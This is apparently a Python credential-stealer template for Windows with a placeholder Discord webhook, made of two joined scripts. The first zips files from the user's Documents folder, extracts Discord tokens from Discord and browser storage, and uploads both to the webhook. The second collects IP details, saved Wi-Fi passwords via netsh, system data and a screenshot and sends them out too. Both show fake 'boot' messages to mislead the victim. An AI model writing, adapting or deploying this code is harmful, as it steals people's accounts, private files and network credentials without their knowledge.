import requests
import os
import zipfile
import tempfile
import shutil
import glob
import re
import socket
import subprocess
import platform
import psutil
import time
import pyautogui
from io import BytesIO

WEBHOOK = "{{WEBHOOK}}"
appdatapath = os.getenv('APPDATA')

def exfiltrate_files():
    documents_folder = os.path.join(os.getenv('USERPROFILE'), 'Documents')

    with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
        zip_filename = temp_zip.name
        file_limit = 8 * 1024 * 1024  # 8 MB limit for Discord

        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            total_size = 0
            for root, _, files in os.walk(documents_folder):
                for file in files:
                    filepath = os.path.join(root, file)
                    if os.path.getsize(filepath) < 500 * 1024:  
                        zipf.write(filepath, os.path.relpath(filepath, documents_folder))  
                        total_size += os.path.getsize(filepath)
                        if total_size >= file_limit:
                            return zip_filename  
    return zip_filename


paths = [
    os.path.join(appdatapath, 'Discord'),
    os.path.join(appdatapath, 'discordcanary'),
    os.path.join(appdatapath, 'discordptb'),
    os.path.join(appdatapath, 'Google', 'Chrome', 'User Data', 'Default'),
    os.path.join(appdatapath, 'Opera Software', 'Opera Stable'),
    os.path.join(appdatapath, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default'),
    os.path.join(appdatapath, 'Yandex', 'YandexBrowser', 'User Data', 'Default')
]


def get_tokens(path):
    tokens = []
    files = glob.glob(path + r"\Local Storage\leveldb\*.ldb")
    files.extend(glob.glob(path + r"\Local Storage\leveldb\*.log"))
    
    for file in files:
        with open(file, 'r', encoding='ISO-8859-1') as content_file:
            try:
                content = content_file.read()
                possible_tokens = [x.group() for x in re.finditer(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[a-zA-Z0-9_\-]{84}', content)]
                if possible_tokens:
                    tokens.extend(possible_tokens)
            except Exception as e:
                print(f"Error reading {file}: {e}")
    return tokens


def send_to_discord(zip_filename, tokens):
 
    renamed_zip = os.path.join(os.path.dirname(zip_filename), "stolen_files.zip")
    shutil.move(zip_filename, renamed_zip)  


    token_content = f"```css\nPulled {len(tokens)} tokens:\n"
    for token in tokens:
        token_content += token + "\n"
        token_content += '---------------------------------\n'
    token_content += "```"


    payload = {
        "content": token_content,
        "username": "glob 'the data gobler' "
    }


    response = requests.post(WEBHOOK, json=payload)
    

    if response.status_code == 204:
        print("please wait while we try and boot this file...")
        

        with open(renamed_zip, "rb") as f:
            file_payload = {'file': f}
            requests.post(WEBHOOK, files=file_payload)


        os.remove(renamed_zip)
    else:
        print(f"Failed to boot please try again... Status code: {response.status_code}")


def main():

    zip_filename = exfiltrate_files()


    tokens = []
    for _dir in paths:
        tokens.extend(get_tokens(_dir))

 
    if tokens:
        send_to_discord(zip_filename, tokens)
    else:
        print("No tokens found.")


if __name__ == "__main__":
    main()



WEBHOOK = "{{WEBHOOK}}"


def get_public_ip_info():
    try:
        ip_info = requests.get("http://ipinfo.io").json()
        return ip_info
    except Exception as e:
        return {"error": str(e)}


def get_wifi_info():
    wifi_info = []
    try:

        result = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True)
        profiles = [line.split(":")[1].strip() for line in result.splitlines() if "All User Profile" in line]

        for profile in profiles:

            profile_info = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"], text=True)
            wifi_info.append(profile_info)
    except Exception as e:
        wifi_info.append(f"Error: {str(e)}")
    
    return "\n\n".join(wifi_info)


def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_buffer = BytesIO()
    screenshot.save(screenshot_buffer, format="PNG")
    screenshot_buffer.seek(0)
    return screenshot_buffer


def get_system_info():
    uname = platform.uname()
    system_info = f"System: {uname.system}\n"
    system_info += f"Node Name: {uname.node}\n"
    system_info += f"Release: {uname.release}\n"
    system_info += f"Version: {uname.version}\n"
    system_info += f"Machine: {uname.machine}\n"
    system_info += f"Processor: {uname.processor}\n"
    
    return system_info


def send_data_to_discord(ip_info, wifi_info, system_info, screenshot_buffer):
    ip_content = f"**IP Information:**\n"
    for key, value in ip_info.items():
        ip_content += f"{key}: {value}\n"

    system_content = f"**System Information:**\n{system_info}"

    wifi_content = f"**Wi-Fi Information:**\n```\n{wifi_info}\n```"

    payload = {
        "content": f"{ip_content}\n{system_content}\n{wifi_content}",
        "username": "Goob 'the info goober' "
    }

    files = {
        "file": ("screenshot.png", screenshot_buffer, "image/png")
    }

    response = requests.post(WEBHOOK, data=payload, files=files)
    if response.status_code == 200:
        print("failed to boot file wait until we retry...")
    else:
        print(f"Failed to boot file please re-open the file...: {response.status_code}")


def main():

    ip_info = get_public_ip_info()

 
    wifi_info = get_wifi_info()

    
    system_info = get_system_info()

  
    screenshot_buffer = take_screenshot()

    
    send_data_to_discord(ip_info, wifi_info, system_info, screenshot_buffer)


if __name__ == "__main__":
    main()
